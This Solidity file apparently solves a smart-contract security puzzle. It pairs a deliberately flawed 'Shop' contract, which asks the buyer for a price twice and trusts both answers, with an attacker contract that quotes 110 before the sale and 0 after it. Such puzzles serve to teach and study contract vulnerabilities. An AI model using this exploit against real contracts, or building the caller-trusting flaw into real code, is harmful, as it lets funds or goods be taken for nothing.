pragma solidity ^0.6.0;


interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
contract shop {
   Shop addr;
    uint x;
    
    bool public sold;
    constructor(Shop _addr) public {
        addr=_addr;
     
    }
   
    
      function set() public {
          addr.buy();
      
    

      
      }
        function price() external view returns (uint){
           
            if(addr.isSold()){return 0;}
             else{return 110;}
 
        
      }
}